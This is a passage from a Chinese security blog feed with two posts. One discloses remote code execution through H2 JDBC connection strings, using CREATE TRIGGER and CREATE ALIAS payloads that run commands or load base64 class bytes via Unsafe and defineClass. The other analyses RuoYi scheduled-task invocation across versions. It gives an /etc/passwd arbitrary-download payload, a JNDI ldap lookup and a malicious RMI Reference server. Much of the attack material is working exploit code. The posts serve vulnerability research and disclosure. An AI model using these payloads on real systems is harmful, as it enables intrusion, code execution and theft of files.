只能好像替换一个为空，好像只能在一个参数名中插，多个函数名插回gg</p><p>下版本加入chains。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/Java-Chains/web-chains">https://github.com/Java-Chains/web-chains</a></p><p><a href="https://tttang.com/archive/1771/">https://tttang.com/archive/1771/</a></p><p><a href="https://whoopsunix.com/docs/java/named%20module/">https://whoopsunix.com/docs/java/named%20module/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247510451&idx=1&sn=a8c582e83e35747d6fae99869fb987ec">https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&amp;mid=2247510451&amp;idx=1&amp;sn=a8c582e83e35747d6fae99869fb987ec</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>h2数据库在jdk17下的rce探索</title>
    <link href="/2024/11/12/h2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9C%A8jdk17%E4%B8%8B%E7%9A%84rce%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/11/12/h2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9C%A8jdk17%E4%B8%8B%E7%9A%84rce%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<p> 很久前就挖到了，某些原因，一直藏到现在，现公开。</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>​H2DataBase 在所有版本中（截止 2024 年 9 月 14 日，H2 最新版本为 2.3.232）均存在代码执行漏洞，在使用 H2 数据库创建 JDBC 连接时，<strong>攻击者可以在初始化时控制触发 Java 代码（所有 JDK 版本），并且不对输入的代码进行检查</strong>，从而导致代码执行漏洞。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>H2 在解析 init 参数时，会对 CreateTrigger 进行 LoadFromsource 特殊处理，根据内容开头判断是否由 Javasc Ript 引擎执行，如果以 &#x2F;&#x2F;JavaScRipt&#x2F;Nashorn 开头，则会编译 JavaScript&#x2F;Nashorn 引擎并执行。但根据我的研究，Create Trigger 时，我可以直接控制生成 Trigger 的代码，这样在不需要任何引擎都可以执行任何代码，在不限制 JDK 版本的情况下，无疑是巨大的风险。（JDK15 中 JavaScript &#x2F;Nashorn引擎被彻底移除）</p><p>org.h2.command.ddl.CreateTrigger#update</p><p><img src="image-20240914153129449.png" alt="image-20240914153129449"></p><p>在创建JDBC连接的时候，如果设置了Trigger，那么就会创建TriggerObject。这里的Triggersource，TriggerName，我们都可以控制。</p><p>org.h2.schema.TriggerObject#setTriggerAction</p><p><img src="image-20240914153619309.png" alt="image-20240914153619309"></p><p>完成后会加载到这里</p><p>org.h2.util.SourceCompiler#getClass</p><p><img src="image-20240914154043556.png" alt="image-20240914154043556"></p><p>就是对一些类进行处理，最后利用Javac编译出恶意的Java代码</p><p><img src="image-20240914154332990.png" alt="image-20240914154332990"></p><p>将恶意的Trigger和Class放入Map中，最后使用LoadClass来加载这个恶意类。</p><p><img src="image-20240914154806170.png" alt="image-20240914154806170"></p><p>反射调用没什么好说的</p><p>Call the stack：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">loadFromSource:<span class="hljs-number">113</span>, TriggerObject (org.h2.schema)<br>load:<span class="hljs-number">87</span>, TriggerObject (org.h2.schema)<br>setTriggerAction:<span class="hljs-number">149</span>, TriggerObject (org.h2.schema)<br>setTriggerSource:<span class="hljs-number">142</span>, TriggerObject (org.h2.schema)<br>update:<span class="hljs-number">125</span>, CreateTrigger (org.h2.command.ddl)<br>update:<span class="hljs-number">139</span>, CommandContainer (org.h2.command)<br>executeUpdate:<span class="hljs-number">304</span>, Command (org.h2.command)<br>executeUpdate:<span class="hljs-number">248</span>, Command (org.h2.command)<br>openSession:<span class="hljs-number">280</span>, Engine (org.h2.engine)<br>createSession:<span class="hljs-number">201</span>, Engine (org.h2.engine)<br>connectEmbeddedOrServer:<span class="hljs-number">344</span>, SessionRemote (org.h2.engine)<br>&lt;init&gt;:<span class="hljs-number">124</span>, JdbcConnection (org.h2.jdbc)<br>connect:<span class="hljs-number">59</span>, Driver (org.h2)<br>getConnection:<span class="hljs-number">681</span>, DriverManager (java.sql)<br>getConnection:<span class="hljs-number">252</span>, DriverManager (java.sql)<br>main:<span class="hljs-number">20</span>, h2client (com.unam4.test)<br></code></pre></td></tr></table></figure><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>由于我们直接受 Java 代码控制，因此此问题不受 JDK 版本影响。</p><p>这里我有一个本地 JDK17 来复现</p><p>Maven 导入最新的依赖项</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.232<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.unam4.test;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">h2client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class.forName(<span class="hljs-string">&quot;org.h2.Driver&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">simplexp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$ void Unam4exp() throws Exception&#123; Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;)\\;&#125;$$&quot;</span>;<br>        java.sql.<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(simplexp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果你使用<strong>Mac系统</strong>，那么他会弹出一个计算器，如果你使用<strong>Win系统</strong>，可以将命令改为<strong>CALC</strong>来验证这个漏洞。</p><p>​最后，其实jdk17（大胆点，jdk通杀）在没有引擎，也可以通过CREATE ALIAS来执行命令 或者准备一个有恶意函数的h2.sql文件，指定后直接call函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.unam4.test;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">h2client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class.forName(<span class="hljs-string">&quot;org.h2.Driver&quot;</span>);<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        ctClass.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> java.util.Base64.getEncoder().encodeToString(ctClass.toBytecode());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER UNAM4EXP BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$void SHELL3() throws Exception&#123;byte[] bytes\\;Class unsafeClass = Class.forName(\&quot;sun.misc.Unsafe\&quot;)\\;java.lang.reflect.Field  field = unsafeClass.getDeclaredField(\&quot;theUnsafe\&quot;)\\;field.setAccessible(true)\\;sun.misc.Unsafe unsafe = (sun.misc.Unsafe) field.get(null)\\;Module module = Object.class.getModule()\\;long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\&quot;module\&quot;))\\;unsafe.putObject(UNAM4EXP.class, offset, module)\\;bytes=java.util.Base64.getDecoder().decode(\&quot;&quot;</span>+s+<span class="hljs-string">&quot;\&quot;)\\;java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;&#125;$$&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">simpleexp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER UNAM4 BEFORE SELECT ON\nINFORMATION_SCHEMA.TABLES AS $$ void UNAM4() throws Exception&#123; Runtime.getRuntime().exec(\&quot;open .\&quot;)\\;&#125;$$&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;void shellexec(String b) throws Exception &#123;  byte[] bytes\\;try&#123; Class unsafeClass = Class.forName(\&quot;sun.misc.Unsafe\&quot;)\\;java.lang.reflect.Field  field = unsafeClass.getDeclaredField(\&quot;theUnsafe\&quot;)\\;field.setAccessible(true)\\;sun.misc.Unsafe unsafe = (sun.misc.Unsafe) field.get(null)\\;Module module = Object.class.getModule()\\;long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\&quot;module\&quot;))\\;unsafe.putObject(EXEC.class, offset, module)\\;bytes=java.util.Base64.getDecoder().decode(b)\\;&#125;catch (Exception e)&#123;e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;&#125;java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;&#125;&#x27;\\;CALL EXEC(&#x27;&quot;</span>+s+<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br>        java.sql.<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(simpleexp);<br><br>        System.out.println(simpleexp);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>​最后，这个问题我在几个月前就给h2官方反应过，结果h2给说了，这就是正常功能？？？？我都能直接控制代码，这真的不算洞吗？？</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ruoyi定时任务浅析</title>
    <link href="/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/"/>
    <url>/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​以前都是直接贴poc，没分析过，最近碰见了也是定时任务，但不是若依的一套，回来看若依，发现若依的逻辑也抽象了，真是捡洞。</p><h3 id="定时任务分析"><a href="#定时任务分析" class="headerlink" title="定时任务分析"></a>定时任务分析</h3><ul><li><p>创建任务</p><p>下载源码后，我们可以在ruoyi-quartz模块，拿到ruoyi定时任务的源码。</p></li></ul><p>com.ruoyi.quartz.controller.SysJobController</p><p><img src="image-20241026174956321.png" alt="image-20241026174956321"></p><p>这里就是对应的模块</p><p>com.ruoyi.quartz.controller.SysJobController#addSave</p><p><img src="image-20241026181824359.png" alt="image-20241026181824359"></p><p>这里创建定时任务，然后经过一系列判断调用jobService.insertJob进行插入数据库中。</p><p>com.ruoyi.quartz.service.impl.SysJobServiceImpl#insertJob</p><p><img src="image-20241026182010206.png" alt="image-20241026182010206"></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">ScheduleConstants.<span class="hljs-keyword">Status</span>.<span class="hljs-keyword">PAUSE</span><br></code></pre></td></tr></table></figure><p><img src="image-20241026182048185.png" alt="image-20241026182048185"></p><p>新建任务时，默认设置暂定状态。</p><p>如果插入成果，调用ScheduleUtils.createScheduleJob创建计划任务</p><p>com.ruoyi.quartz.util.ScheduleUtils#createScheduleJob</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createScheduleJob</span><span class="hljs-params">(Scheduler scheduler, SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Job</span>&gt; jobClass = getQuartzJobClass(job);<br>    <span class="hljs-comment">// 构建job信息</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">jobId</span> <span class="hljs-operator">=</span> job.getJobId();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jobGroup</span> <span class="hljs-operator">=</span> job.getJobGroup();<br>    <span class="hljs-type">JobDetail</span> <span class="hljs-variable">jobDetail</span> <span class="hljs-operator">=</span> JobBuilder.newJob(jobClass).withIdentity(getJobKey(jobId, jobGroup)).build();<br><br>    <span class="hljs-comment">// 表达式调度构建器</span><br>    <span class="hljs-type">CronScheduleBuilder</span> <span class="hljs-variable">cronScheduleBuilder</span> <span class="hljs-operator">=</span> CronScheduleBuilder.cronSchedule(job.getCronExpression());<br>    cronScheduleBuilder = handleCronScheduleMisfirePolicy(job, cronScheduleBuilder);<br><br>    <span class="hljs-comment">// 按新的cronExpression表达式构建一个新的trigger</span><br>    <span class="hljs-type">CronTrigger</span> <span class="hljs-variable">trigger</span> <span class="hljs-operator">=</span> TriggerBuilder.newTrigger().withIdentity(getTriggerKey(jobId, jobGroup))<br>            .withSchedule(cronScheduleBuilder).build();<br><br>    <span class="hljs-comment">// 放入参数，运行时的方法可以获取</span><br>    jobDetail.getJobDataMap().put(ScheduleConstants.TASK_PROPERTIES, job);<br><br>    <span class="hljs-comment">// 判断是否存在</span><br>    <span class="hljs-keyword">if</span> (scheduler.checkExists(getJobKey(jobId, jobGroup)))<br>    &#123;<br>        <span class="hljs-comment">// 防止创建时存在数据问题 先移除，然后在执行创建操作</span><br>        scheduler.deleteJob(getJobKey(jobId, jobGroup));<br>    &#125;<br><br>    <span class="hljs-comment">// 判断任务是否过期</span><br>    <span class="hljs-keyword">if</span> (StringUtils.isNotNull(CronUtils.getNextExecution(job.getCronExpression())))<br>    &#123;<br>        <span class="hljs-comment">// 执行调度任务</span><br>        scheduler.scheduleJob(jobDetail, trigger);<br>    &#125;<br><br>    <span class="hljs-comment">// 暂停任务</span><br>    <span class="hljs-keyword">if</span> (job.getStatus().equals(ScheduleConstants.Status.PAUSE.getValue()))<br>    &#123;<br>        scheduler.pauseJob(ScheduleUtils.getJobKey(jobId, jobGroup));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到，常见任务，主要就是build了一个jobDetail，trigger。其中trigger和jobId，jobGroup，cronScheduleBuilder进行绑定，</p><p>jobDetail就是放入了job的一些信息。最后把他们注册到scheduler中，让他去执行</p><ul><li>再来看执行</li></ul><p>com.ruoyi.quartz.controller.SysJobController#run</p><p><img src="image-20241026184215206.png" alt="image-20241026184215206"></p><p>调用jobService.run。</p><p><img src="image-20241026184306868.png" alt="image-20241026184306868"></p><p>有了上面的基础，这里就很能看懂了，new 一个JobDataMap，把任务参数put进去，在传入的jobid调用ScheduleUtils去找Schedule中找jobkey。然后调用triggerJob。</p><p>org.quartz.core.QuartzScheduler#triggerJob(org.quartz.JobKey, org.quartz.JobDataMap)</p><p><img src="image-20241026184609843.png" alt="image-20241026184609843"></p><p>新建一个trigger和我们jobkey,JobDataMap绑定, 然后调用storeTrigger，加入到jobList，进行触发。</p><ul><li><p>Scheduler进行触发</p><p>org.quartz.simpl.SimpleThreadPool.WorkerThread#run()</p><p><img src="image-20241026185915296.png" alt="image-20241026185915296"></p><p>最后就会调用到invokeMethod</p><p>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob)</p><p><img src="image-20241026190013651.png" alt="image-20241026190013651"></p><p>获取SysJob中的参数，首先判断是不是bean，bean就调用getbean获取。不是然后反射调用。太搞了，参数都是前端传进来的。</p></li><li><p>总结</p><p>创建任务是，会将任务参数插入到数据库中，成功后，就新建jobDetail，trigger，然后注册到scheduler。立即执行时，会重新创建一个trigger，在和job绑定到scheduler中触发。</p></li></ul><p>com.ruoyi.quartz.controller.SysJobController#changeStatus</p><p><img src="image-20241026190730682.png" alt="image-20241026190730682"></p><p>找到Job,设置job的 status;，然后调用</p><p><img src="image-20241026191025335-9941025.png" alt="image-20241026191025335"></p><p>根据传入的status，进行分别调用。</p><p><img src="image-20241026191238679.png" alt="image-20241026191238679"></p><p><img src="image-20241026191248254.png" alt="image-20241026191248254"></p><p>最后也是调用到scheduler执行执行或者暂停，</p><h3 id="poc-构造"><a href="#poc-构造" class="headerlink" title="poc 构造"></a>poc 构造</h3><p><img src="image-20241026191551371.png" alt="image-20241026191551371"></p><p>就是在进行赋值的时候会有黑名单</p><p>com&#x2F;ruoyi&#x2F;common&#x2F;constant&#x2F;Constants.java</p><p><img src="image-20241026191655501.png" alt="image-20241026191655501"></p><p>这里手动修改了，注视了4.7.9的名单，这里看见了，4.7.9已经是白名单了，且只有一个类，没得玩了。</p><p><img src="image-20241026191809857.png" alt="image-20241026191809857"></p><ul><li>4.7.8的黑明单</li></ul><p><img src="image-20241026191948450.png" alt="image-20241026191948450"></p><p>还是有很多操作空间</p><ul><li>4.7.5</li></ul><p><img src="image-20241026192139622.png" alt="image-20241026192139622"></p><p>没有com.ruoyi.common.config</p><ul><li>4.7.2</li></ul><p><img src="image-20241026192230974.png" alt="image-20241026192230974"></p><p>这里没白名单，且黑名单也少，也就是《&#x3D;4.7.2以前，基本就和无限制调用<strong>任意类任意方法</strong>没什么区别</p><h4 id="首先来看-4-7-5"><a href="#首先来看-4-7-5" class="headerlink" title="首先来看 4.7.5"></a>首先来看 4.7.5</h4><p>主要就是这个类</p><p>com.ruoyi.common.config</p><p><img src="image-20241026192627909.png" alt="image-20241026192627909"></p><p>一共三个</p><p>主要有用的就是com.ruoyi.common.config.RuoYiConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>      <span class="hljs-comment">/** 上传路径 */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String profile;<br>...<br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProfile</span><span class="hljs-params">(String profile)</span><br>    &#123;<br>        RuoYiConfig.profile = profile;<br>    &#125;<br>...<br></code></pre></td></tr></table></figure><p>又一个方法可以配置上传路径。</p><p>com.ruoyi.web.controller.common.CommonController#resourceDownload</p><p><img src="image-20241026192957302.png" alt="image-20241026192957302"></p><p>配个&#x2F;download&#x2F;resource可任意文件下来</p><p><img src="image-20241026193042503.png" alt="image-20241026193042503"></p><p><img src="image-20241026193338055.png" alt="image-20241026193338055"></p><p>这里检查也没什么用，我们用不上，主要就差..&#x2F;和文件后缀</p><p>主要是这个</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">+</span> <span class="hljs-variable">StringUtils</span><span class="hljs-operator">.</span><span class="hljs-variable">substringAfter</span><span class="hljs-punctuation">(</span><span class="hljs-variable">resource</span><span class="hljs-operator">,</span> <span class="hljs-built_in">Constants</span><span class="hljs-operator">.</span><span class="hljs-type">RESOURCE_PREFIX</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span><br></code></pre></td></tr></table></figure><p><img src="image-20241026193143044.png" alt="image-20241026193143044"></p><p><img src="image-20241026193136517.png" alt="image-20241026193136517"></p><p>他会在我们传入的resource找&#x2F;profile，没有返回控，有就截取&#x2F;profile后面的进行拼接，</p><p>因为这里是把我们传入resource和RuoYiConfig.profile 拼接，只要resource没有**&#x2F;profile**,会返回控，这样路径就只要RuoYiConfig.profile，也就是我们只要把RuoYiConfig.profile设置成要下载的文件名就行了</p><p><img src="image-20241026193736119.png" alt="image-20241026193736119"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">com.ruoyi.common.config.RuoYiConfig.setProfile(&#x27;/etc/passwd&#x27;)   //全类名<br>ruoyiConfig.setProfile(&#x27;/etc/passwd&#x27;)                   //bean形式<br></code></pre></td></tr></table></figure><p>执行后在访问 <a href="http://127.0.0.1:8088/common/download/resource?resource=1.txt">http://127.0.0.1:8088/common/download/resource?resource=1.txt</a> 就可以下载，这里resource随便写,后缀在白名单里找一个就行，反正最后返回空。</p><p><img src="image-20241026193847260-9942729.png" alt="image-20241026193847260"></p><p>这样就完成了任意文件下载。</p><h4 id="4-7-2-相当于没有限制"><a href="#4-7-2-相当于没有限制" class="headerlink" title="4.7.2 相当于没有限制"></a>4.7.2 相当于没有限制</h4><p><a href="https://github.com/SpringKill-team/SecurityInspector">https://github.com/SpringKill-team/SecurityInspector</a></p><p>直接来我们的项目<a href="https://github.com/SpringKill-team/SecurityInspector/blob/preview/src/main/kotlin/org/skgroup/securityinspector/rules/jndi/JNDIInjection.kt">SpringKill-team&#x2F;SecurityInspector</a> 找个</p><p><img src="image-20241026194501101.png" alt="image-20241026194501101"></p><p>太多了太酷了</p><p><img src="image-20241026194802637.png" alt="image-20241026194802637"></p><p>随便找一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.jndi.JndiTemplate.lookup(<span class="hljs-string">&#x27;ldap://127.0.0.1:1389/remoteExploit8&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="image-20241026194959880.png" alt="image-20241026194959880"></p><p>执行后也是可以的，要是高版本也很简单，看我的补天大会上的ppt。直接上才艺, 返回一个恶意reference</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ruoyiref</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;com.zaxxer.hikari.HikariJNDIFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                    <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;)\n&quot;</span> +<br>                    <span class="hljs-string">&quot;$$\n&quot;</span>;<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;jdbcUrl&quot;</span>, JDBC_URL));<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1097</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;exp&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-7-8"><a href="#4-7-8" class="headerlink" title="4.7.8"></a>4.7.8</h4><p>忘记说了 </p><p>com.ruoyi.quartz.util.JobInvokeUtil#getMethodParams</p><p>参数执行是下面几个类型</p><p><img src="image-20241026195221549.png" alt="image-20241026195221549"></p><p>这个版本限制了只白名单只能是com.ruoyi开头的类，且不在黑名单中就行。</p><p>网上公开就是通过sql去改sys_job中的invoke_target。</p><p>com.ruoyi.generator.service.impl.GenTableServiceImpl#createTable</p><p><img 